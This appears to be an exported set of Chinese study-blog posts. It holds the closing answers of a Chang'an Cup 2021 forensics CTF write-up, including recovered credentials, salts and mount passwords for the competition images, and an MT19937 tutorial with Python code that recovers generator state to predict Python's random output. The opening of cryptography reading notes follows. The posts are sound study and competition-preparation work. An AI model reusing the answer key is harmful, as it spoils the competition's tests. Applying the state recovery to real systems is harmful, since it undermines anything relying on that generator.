式：111.111.111.111】</h3><p>由上题可知，转发到了<br><code>192.168.110.113</code></p><h2 id="第二十二题"><a href="#第二十二题" class="headerlink" title="第二十二题"></a>第二十二题</h2><h3 id="检材三的原始硬盘的SHA256值为："><a href="#检材三的原始硬盘的SHA256值为：" class="headerlink" title="检材三的原始硬盘的SHA256值为："></a>检材三的原始硬盘的SHA256值为：</h3><p>挂载密码：<code>192.168.110.113-CAB2021</code><br>由上边分析可知，最后被转发到了第三个服务器，因此使用x-ways恢复镜像文件计算sha值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">205C1120874CE0E24ABFB3BB1525ACF330E05111E4AD1D323F3DEE59265306BF<br></code></pre></td></tr></table></figure><h2 id="第二十三题"><a href="#第二十三题" class="headerlink" title="第二十三题"></a>第二十三题</h2><h3 id="请分析第21题中，所指的服务器的开机密码为："><a href="#请分析第21题中，所指的服务器的开机密码为：" class="headerlink" title="请分析第21题中，所指的服务器的开机密码为："></a>请分析第21题中，所指的服务器的开机密码为：</h3><p>Linux密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和<code>/etc/shadow</code></p><h2 id="第二十四题"><a href="#第二十四题" class="headerlink" title="第二十四题"></a>第二十四题</h2><h3 id="嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为："><a href="#嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：" class="headerlink" title="嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为："></a>嫌疑人架设网站使用了宝塔面板，请问面板的登陆用户名为：</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506210329895.png"><br>仿真分析，得到用户名为<code>hl123</code></p><h2 id="第二十五题"><a href="#第二十五题" class="headerlink" title="第二十五题"></a>第二十五题</h2><h3 id="请分析用于重置宝塔面板密码的函数名为"><a href="#请分析用于重置宝塔面板密码的函数名为" class="headerlink" title="请分析用于重置宝塔面板密码的函数名为"></a>请分析用于重置宝塔面板密码的函数名为</h3><p>宝塔面板重置网站密码功能调用的是<code>/www/server/panel/tools.py</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212351998.png"><br>因此为<code>set_panel_pwd</code></p><h2 id="第二十六题"><a href="#第二十六题" class="headerlink" title="第二十六题"></a>第二十六题</h2><h3 id="请分析宝塔面板登陆密码的加密方式所使用的哈希算法为"><a href="#请分析宝塔面板登陆密码的加密方式所使用的哈希算法为" class="headerlink" title="请分析宝塔面板登陆密码的加密方式所使用的哈希算法为"></a>请分析宝塔面板登陆密码的加密方式所使用的哈希算法为</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212534263.png"><br>哈希算法为<code>md5</code></p><h2 id="第二十七题"><a href="#第二十七题" class="headerlink" title="第二十七题"></a>第二十七题</h2><h3 id="请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法"><a href="#请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法" class="headerlink" title="请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法"></a>请分析宝塔面板对于其默认用户的密码一共执行了几次上题中的哈希算法</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506212855249.png"><br>找到<code>public</code>模块的导入文件<code>public.py</code>，查看得到<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506213204658.png"><br>发现<code>password_salt</code>文件有两次md5，加上之前的一次，共<code>3</code>次</p><h2 id="第二十八题"><a href="#第二十八题" class="headerlink" title="第二十八题"></a>第二十八题</h2><h3 id="请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】"><a href="#请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】" class="headerlink" title="请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】"></a>请分析当前宝塔面板密码加密过程中所使用的salt值为【区分大小写】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506213800029.png"><br>发现访问的是<code>data/default.db</code>数据库，查看得到<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214117926.png"><br>salt为<code>v87ilhAVumZL</code></p><h2 id="第二十九题"><a href="#第二十九题" class="headerlink" title="第二十九题"></a>第二十九题</h2><h3 id="请分析该服务器，网站源代码所在的绝对路径为【标准格式-xxx-xxx-xxx】"><a href="#请分析该服务器，网站源代码所在的绝对路径为【标准格式-xxx-xxx-xxx】" class="headerlink" title="请分析该服务器，网站源代码所在的绝对路径为【标准格式&#x2F;xxx&#x2F;xxx&#x2F;xxx】"></a>请分析该服务器，网站源代码所在的绝对路径为【标准格式&#x2F;xxx&#x2F;xxx&#x2F;xxx】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214346314.png"><br>火眼中查看得到<code>/www/wwwroot/www.honglian7001</code></p><h2 id="第三十题"><a href="#第三十题" class="headerlink" title="第三十题"></a>第三十题</h2><h3 id="请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材5，并重构网-站）【标准格式：111-111-111-111】"><a href="#请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材5，并重构网-站）【标准格式：111-111-111-111】" class="headerlink" title="请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材5，并重构网 站）【标准格式：111.111.111.111】"></a>请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材5，并重构网 站）【标准格式：111.111.111.111】</h3><p>找到网站数据库相关文件<code>www/wwwroot/www.honglian7001/app/database.php</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506214726041.png"><br> 得到IP地址<code>192.168.110.115</code></p><h2 id="第三十一题"><a href="#第三十一题" class="headerlink" title="第三十一题"></a>第三十一题</h2><h3 id="请分析，数据库的登陆密码为【区分大小写】"><a href="#请分析，数据库的登陆密码为【区分大小写】" class="headerlink" title="请分析，数据库的登陆密码为【区分大小写】"></a>请分析，数据库的登陆密码为【区分大小写】</h3><p>同上图片中：<br><code>wxrM5GtNXk5k5EPX</code></p><h2 id="第三十二题"><a href="#第三十二题" class="headerlink" title="第三十二题"></a>第三十二题</h2><h3 id="请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：-web】"><a href="#请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：-web】" class="headerlink" title="请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：&#x2F;web】"></a>请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：&#x2F;web】</h3><p>查看<code>/admin/common.php</code>发现是后台管理文件，<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506220009033.png"><br>后台管理入口为：<code>/admin</code></p><p>Raid重组网站<br>先将<code>检材五001.zip</code>解压得到<code>检材五001.txt</code>，然后用VeraCrypt挂载，挂载密码为<code>192.168.110.115-CAB2021</code><br>使用<code>FTK image</code>挂载得到的3个dd文件，挂载模式选择可写。<br>在R-studio中创建虚拟卷组和RAID，然后将这几个磁盘移入，进行自动检测<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506225022105.png"><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506225410033.png"><br>之后进行创建镜像,然后进行仿真，此时访问<code>http://192.168.110.113/admin/common/login.shtml</code></p><h2 id="第三十三题"><a href="#第三十三题" class="headerlink" title="第三十三题"></a>第三十三题</h2><h3 id="已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】"><a href="#已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】" class="headerlink" title="已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】"></a>已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大小写】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506233546876.png"><br>可以看出salt值为：<code>lshi4AsSUrUOwWV</code></p><h2 id="第三十四题"><a href="#第三十四题" class="headerlink" title="第三十四题"></a>第三十四题</h2><h3 id="请分析该网站的管理员用户的密码为"><a href="#请分析该网站的管理员用户的密码为" class="headerlink" title="请分析该网站的管理员用户的密码为"></a>请分析该网站的管理员用户的密码为</h3><p>查看运行日志<code>www.honglian7001/runtime/log/202104/24.log</code><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234346423.png"><br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234525867.png"><br>发现两个，尝试之后得到密码为：<code>security</code></p><h2 id="第三十五题"><a href="#第三十五题" class="headerlink" title="第三十五题"></a>第三十五题</h2><h3 id="在对后台账号的密码加密处理过程中，后台一共计算几次哈希值"><a href="#在对后台账号的密码加密处理过程中，后台一共计算几次哈希值" class="headerlink" title="在对后台账号的密码加密处理过程中，后台一共计算几次哈希值"></a>在对后台账号的密码加密处理过程中，后台一共计算几次哈希值</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506234643140.png"><br><code>3</code>次</p><h1 id="烂尾…"><a href="#烂尾…" class="headerlink" title="烂尾…"></a>烂尾…</h1><p>后续的题目不知道是不是环境问题，复现失败了，看来本次也只能烂尾了。<br>本来这次复现就是给盘古石杯做准备，现在盘古石杯已经比完了（学了几天拼尽全力也只混到了一个二等奖，还多亏队友带飞┭┮﹏┭┮），等下次美亚杯再继续学习取证吧（溜了溜了…）</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础篇-MT19937</title>
    <link href="/2025/04/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-MT19937/"/>
    <url>/2025/04/29/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-MT19937/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>梅森旋转（Mersenne Twister）是一个PRNG（伪随机数发生器），基于有限二进制字段上的矩阵线性递归，可快速产生高质量的伪随机数，周期为$2^{19937}-1$，也就是19937bits。<br>python中的random库使用的便是这种算法。</p><h3 id="实现步骤："><a href="#实现步骤：" class="headerlink" title="实现步骤："></a>实现步骤：</h3><ol><li>获得基础的梅森旋转链</li><li>对于旋转链进行旋转算法</li><li>对旋转算法所得结果进行处理</li></ol><h3 id="涉及变量："><a href="#涉及变量：" class="headerlink" title="涉及变量："></a>涉及变量：</h3><ul><li>$w:$ 加密长度，以bit为单位，$w$位整数</li><li>$n:$ 递归长度</li><li>$m:$ 周期参数，用于第三阶段的偏移量</li><li>$a:$ 旋转矩阵的参数</li><li>$r:$ 低位掩码，即低位要提取的位数</li><li>$f:$ 初始化旋转链所需参数</li><li>$b,c:$ TGFSR的掩码</li><li>$s,t:$ TGFSR的位移量</li><li>$u,d,l:$ 额外的梅森旋转所需要的掩码和位移量</li></ul><h1 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h1><h2 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1.初始化"></a>1.初始化</h2><p>将传入的seed赋值给$MT_0$作为初始值，并且递推得到旋转链<br><strong>递推式：</strong> $MT_I&#x3D;f\times [(MT_{i-1})\oplus((MT_{i-1})&gt;&gt;(w-2))]+i$</p><h2 id="2-旋转算法"><a href="#2-旋转算法" class="headerlink" title="2.旋转算法"></a>2.旋转算法</h2><p>连接$MT_i$的高$w-r$位和$MT_{i+1}$的低$r$位，若这个组合后的二进制数末位为0，将其除以2。否则将这个数除以2后再与$a$进行异或。假设我们最终得到的数字为$P$<br>我们得到递推式为$MT_i&#x3D;MT_{i+m}\oplus P$</p><h2 id="3-结果处理"><a href="#3-结果处理" class="headerlink" title="3.结果处理"></a>3.结果处理</h2><p>设$x$是该序列的下一个值，$y$是一个中间变量，$z$是算法的返回值。<br>处理过程如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">y = x ^ ((x&gt;&gt;u) &amp; d)<br>y = y ^ ((y&lt;&lt;s) &amp; b)<br>y = y ^ ((y&lt;&lt;t) &amp; c)<br>z = y ^ (y&gt;&gt;l)<br></code></pre></td></tr></table></figure><h2 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_int32</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">0xFFFFFFFF</span> &amp; x)<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MT19937</span>:<br>    <span class="hljs-comment"># 根据seed初始化624的state</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, seed</span>):<br>        <span class="hljs-variable language_">self</span>.mt = [<span class="hljs-number">0</span>] * <span class="hljs-number">624</span><br>        <span class="hljs-variable language_">self</span>.mt[<span class="hljs-number">0</span>] = seed<br>        <span class="hljs-variable language_">self</span>.mti = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">624</span>):<br>            <span class="hljs-variable language_">self</span>.mt[i] = _int32(<span class="hljs-number">1812433253</span> * (<span class="hljs-variable language_">self</span>.mt[i - <span class="hljs-number">1</span>] ^ <span class="hljs-variable language_">self</span>.mt[i - <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>) + i)<br> <br>    <span class="hljs-comment"># 提取伪随机数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.mti == <span class="hljs-number">0</span>:<br>            <span class="hljs-variable language_">self</span>.twist()<br>        y = <span class="hljs-variable language_">self</span>.mt[<span class="hljs-variable language_">self</span>.mti]<br>        y = y ^ y &gt;&gt; <span class="hljs-number">11</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span><br>        y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span><br>        y = y ^ y &gt;&gt; <span class="hljs-number">18</span><br>        <span class="hljs-variable language_">self</span>.mti = (<span class="hljs-variable language_">self</span>.mti + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br>        <span class="hljs-keyword">return</span> _int32(y)<br> <br>    <span class="hljs-comment"># 对状态进行旋转</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twist</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">624</span>):<br>            y = _int32((<span class="hljs-variable language_">self</span>.mt[i] &amp; <span class="hljs-number">0x80000000</span>) + (<span class="hljs-variable language_">self</span>.mt[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>))<br>            <span class="hljs-variable language_">self</span>.mt[i] = (y &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-variable language_">self</span>.mt[(i + <span class="hljs-number">397</span>) % <span class="hljs-number">624</span>]<br> <br>            <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>                <span class="hljs-variable language_">self</span>.mt[i] = <span class="hljs-variable language_">self</span>.mt[i] ^ <span class="hljs-number">0x9908b0df</span><br></code></pre></td></tr></table></figure><h1 id="解密方法"><a href="#解密方法" class="headerlink" title="解密方法"></a>解密方法</h1><p><strong>关键：</strong> 求出一个周期内的全部内容，然后便可以推出前面的所有情况</p><h2 id="1-逆向第四步"><a href="#1-逆向第四步" class="headerlink" title="1.逆向第四步"></a>1.逆向第四步</h2><p>$z &#x3D; y \oplus (y&gt;&gt;l)$，求$y$</p><ul><li><strong>高$l$位：</strong> 可以看出$y$的高$l$位便是$z$的高$l$位</li><li><strong>高$l\sim 2l$位：</strong> 由$z$的高$(l\sim 2l)\oplus y的高l位$得到$y的高l\sim 2l位$</li><li><strong>高$il\sim (i+1)l$位：</strong> 同上由$z$的高$(il\sim (i+1)l)\oplus y$的高$[(i-1)l]\sim il$位得到</li></ul><h2 id="2-逆向第三步"><a href="#2-逆向第三步" class="headerlink" title="2.逆向第三步"></a>2.逆向第三步</h2><p>$y_1 &#x3D; y \oplus ((y&lt;&lt;t) \land c)$，求$y$</p><ul><li><strong>低$t$位：</strong> 可以看出$y_1$的低$t$位便是$y$的低$t$位<strong>异或</strong>$c$的低$t$位</li><li><strong>低$it\sim (i+1)t$位：</strong> 由$y_1$的低$it\sim (i+1)t$位与$y的(i-1)\sim it$位与$c$的$it\sim (i+1)t$的<strong>并的异或</strong></li></ul><h2 id="3-逆向第二、一步"><a href="#3-逆向第二、一步" class="headerlink" title="3.逆向第二、一步"></a>3.逆向第二、一步</h2><p>与上同理，总代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># right shift inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right</span>(<span class="hljs-params">res, shift, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &gt;&gt; shift  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># right shift with mask inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_right_mask</span>(<span class="hljs-params">res, shift, mask, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &gt;&gt; shift &amp; mask  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># left shift inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left</span>(<span class="hljs-params">res, shift, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &lt;&lt; shift  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-comment"># left shift with mask inverse  </span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inverse_left_mask</span>(<span class="hljs-params">res, shift, mask, bits=<span class="hljs-number">32</span></span>):  <br>tmp = res  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(bits // shift):  <br>tmp = res ^ tmp &lt;&lt; shift &amp; mask  <br><span class="hljs-keyword">return</span> tmp  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_number</span>(<span class="hljs-params">y</span>):  <br>y = y ^ y &gt;&gt; <span class="hljs-number">11</span>  <br>y = y ^ y &lt;&lt; <span class="hljs-number">7</span> &amp; <span class="hljs-number">2636928640</span>  <br>y = y ^ y &lt;&lt; <span class="hljs-number">15</span> &amp; <span class="hljs-number">4022730752</span>  <br>y = y ^ y &gt;&gt; <span class="hljs-number">18</span>  <br><span class="hljs-keyword">return</span> y&amp;<span class="hljs-number">0xffffffff</span>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recover</span>(<span class="hljs-params">y</span>):  <br>y = inverse_right(y,<span class="hljs-number">18</span>)  <br>y = inverse_left_mask(y,<span class="hljs-number">15</span>,<span class="hljs-number">4022730752</span>)  <br>y = inverse_left_mask(y,<span class="hljs-number">7</span>,<span class="hljs-number">2636928640</span>)  <br>y = inverse_right(y,<span class="hljs-number">11</span>)  <br><span class="hljs-keyword">return</span> y&amp;<span class="hljs-number">0xffffffff</span>  <br><span class="hljs-built_in">print</span>(recover(<span class="hljs-number">0xf1c680f8</span>))  <br><span class="hljs-string">&#x27;&#x27;&#x27;  </span><br><span class="hljs-string">for i in s:  </span><br><span class="hljs-string">print(recover(i))  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">y = extract_number(o)  </span><br><span class="hljs-string">print(&#x27;y=&#x27;,y,&#x27;o=&#x27;,o)  </span><br><span class="hljs-string">print(recover(y) == o)  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>对于MT32的一些参数：<br>$(w,n,m,r)&#x3D;(32,624,397,31)$<br>$(a,f)&#x3D;(9908B0DF_h,1812433253)$<br>$(u,d,s,b,t,c)&#x3D;(11,FFFFFFFF_h),7,9D2C5680_h,15,EFC60000_h$<br>$l&#x3D;18$</p></blockquote><h1 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h1><h2 id="1-逆向随机数产生器内部的state中的内容"><a href="#1-逆向随机数产生器内部的state中的内容" class="headerlink" title="1.逆向随机数产生器内部的state中的内容"></a>1.逆向随机数产生器内部的state中的内容</h2><h2 id="2-预测后面的随机数"><a href="#2-预测后面的随机数" class="headerlink" title="2.预测后面的随机数"></a>2.预测后面的随机数</h2><h2 id="3-求出之前的随机数"><a href="#3-求出之前的随机数" class="headerlink" title="3.求出之前的随机数"></a>3.求出之前的随机数</h2><p><strong>参考</strong>：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">Explore MT19937 - huangx607087’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Introduction To Modern Cryptography学习随笔</title>
    <link href="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"/>
    <url>/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>在老师的推荐下，我学习了《Introduction To Modern Cryptography》一书的部分内容，本文用来记录阅读过程中的一些随笔，可能会有些潦草，如果往后有了更深的认识，会回来继续完善。</p><p>这是我第一次大篇幅阅读英文书籍，刚开始读确实比较难以接受，因为要频繁地搜索一些单词含义，有时候一些地方中文翻译之后与原文含义相差甚远，因此还是硬着头皮大概过了一下原文。<br>读的过程中我发现本书会花费大量的篇幅去论述一个定义，很适合初学者去接触理解每个定义的深层次含义。</p><h1 id="3-私钥密码"><a href="#3-私钥密码" class="headerlink" title="3.私钥密码"></a>3.私钥密码</h1><h2 id="3-1-计算安全性"><a href="#3-1-计算安全性" class="headerlink" title="3.1 计算安全性"></a>3.1 计算安全性</h2><p><strong>计算安全相对于信息论安全（完美安全）包含两个放松</strong></p><ul><li>仅针对有效攻击者（合理时间或有限资源）</li><li>允许攻击者有较小概率成功（概率足够小，可忽略不计）</li></ul><h3 id="3-1-1-具体方法"><a href="#3-1-1-具体方法" class="headerlink" title="3.1.1 具体方法"></a>3.1.1 具体方法</h3><p>计算安全的具体方法通过明确限定<strong>时间</strong>和<strong>计算资源</strong>下，攻击者的最大成功概率，来量化加密方案的安全性。具体的安全性定义形式如下：</p><ul><li>如果任意一个时间上限为$t$的攻击者都不能以成功概率高于$\epsilon$的概率破解加密方案，这个方案便是$(t,\epsilon)-安全$ 的。</li></ul><h3 id="3-1-2-渐近方法"><a href="#3-1-2-渐近方法" class="headerlink" title="3.1.2 渐近方法"></a>3.1.2 渐近方法</h3><p>具体安全性方法存在一些技术和理论上的困难。因此在抽象描述方案时使用，使用渐近方法。引入安全性参数$n$，并让其与密钥长度对应，把对手的运行时间和成功概率视为安全参数的函数。</p><h4 id="渐近法详细说明"><a href="#渐近法详细说明" class="headerlink" title="渐近法详细说明"></a>渐近法详细说明</h4><ul><li><strong>有效算法：</strong> 将“有效对手”等同于运行时间在$n$的多项式内的随机化（即概率性）算法。这意味着存在某个多项式$p$，当安全参数为$n$时，对手的运行时间不超过$p(n)$。</li><li><strong>可忽略成功率：</strong> 将“成功概率小”这一概念等同于小于$n$的任何逆多项式的成功概率。即$\epsilon &lt; \frac{1}{p(n)}$</li></ul><blockquote><p><strong>多项式时间：</strong> 时间复杂度为$O(1)、O(nlog_n)、O(n^k)，其中k为某个常数$，等形式所需要的时间的为多项式时间。<br><strong>非（超）多项式时间：</strong> 如时间复杂为$O(n!)、O(a^n)$，等算法所需要的时间为非（超）多项式时间。</p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>任何安全定义由两部分组成</strong>：</p><ul><li>对方案的“攻破”（即安全目标）</li><li>对对手能力的详细说明（即威胁模型）</li></ul><p><strong>渐近安全定义：</strong><br>如果每个ppt攻击者A执行某个特定类型的攻击，对于每个多项式$p(·)$，存在一个整数$N$，当安全参数$n$大于$N$时，攻击者成功破解的概率小于$\frac {1}{p(n)}$​，成功概率小于$\frac {1}{p(n)}$，则这个方案是安全的。</p><blockquote><p><strong>ppt攻击者</strong>：即“概率多项式时间（probabilistic polynomial-time）攻击者”。这意味着攻击者是一个随机化算法，其运行时间是安全参数n的多项式函数。</p></blockquote><h4 